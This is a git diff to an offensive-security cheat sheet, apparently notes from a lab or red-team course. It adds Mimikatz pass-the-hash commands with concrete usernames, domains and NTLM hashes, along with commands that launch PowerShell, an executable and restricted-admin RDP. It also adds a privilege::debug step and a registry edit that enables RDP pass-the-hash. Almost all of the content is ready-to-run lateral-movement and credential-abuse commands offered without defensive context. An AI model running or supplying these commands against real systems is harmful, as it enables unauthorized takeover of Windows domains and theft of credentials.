@@ -30,10 +30,19 @@ Invoke-Rubeus triage
 
 ## Mimikatz
 ```
-sekurlsa::pth /user:[USER] /domain:[DOMAIN] /ntlm:[NTLM HASH]
+sekurlsa::pth /user:[USER] /domain:[DOMAIN] /ntlm:[NTLM HASH] /run:"[cmd]"
+sekurlsa::pth /user:sqlsvc01 /domain:DEV.FINAL.COM /ntlm:077a55c458dc4002dfdc5321a7659526 /run:"C:\Users\Public\test.exe"
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
 ```
 
 * Fix Format 
 ```
 tr -d '\040\011\012\015'
+```
+
+## RDP
+```
+privilege::debug
+sekurlsa::pth /user:[domain shorthand]\admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
+New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
 ```
